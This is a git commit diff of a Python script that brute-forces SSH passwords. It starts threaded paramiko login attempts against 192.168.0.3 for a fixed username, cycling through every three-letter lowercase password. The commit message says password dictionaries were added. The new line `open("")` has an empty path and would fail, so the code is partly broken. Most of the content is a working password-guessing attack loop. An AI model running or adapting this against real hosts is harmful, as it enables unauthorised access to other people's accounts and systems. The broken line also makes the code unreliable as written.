5682816ea05cd3e499756ac31aa94f6f3bb44748
Michael <truell20@gmail.com>
2015-07-16 07:28:43 -0400

    Added in password dictionaries

--- PythonBruteForce/BruteForce.py
+++ PythonBruteForce/BruteForce.py
@@ -19,31 +19,17 @@ def attempt(IP,UserName,Password):
 
 ip = '192.168.0.3'
 username = 'michaeltruell'
-###alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
 start_time = time.time()
-var = itertools.permutations(string.ascii_lowercase,3)
+passwordDictionary = open("")
+permutations = itertools.product(string.ascii_lowercase, repeat=3)
 index = 0
-for i in var:
-    password = ''.join(i)
+for permutation in permutations:
+    password = ''.join(permutation)
     index += 1
-    if index % 100 == 0:
+    if index % 1 == 0:
         print ("on: %s" % password)
     t = threading.Thread(target=attempt, args=(ip,username,password))
     t.start()
-    '''try:
-        print("password %s" % (password))
-        client.connect(hostname=ip, username=username, password=password)
-        print ("Success; password is: " + password)
-        sys.exit(0)
-    except paramiko.AuthenticationException:
-        continue
-    except paramiko.ssh_exception.SSHException:
-        print("Exception")
-        client.close()
-        time.sleep(1)
-        client = paramiko.SSHClient()
-        client.load_system_host_keys()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())'''
 
 
 print("--- %s seconds ---" % (time.time() - start_time))
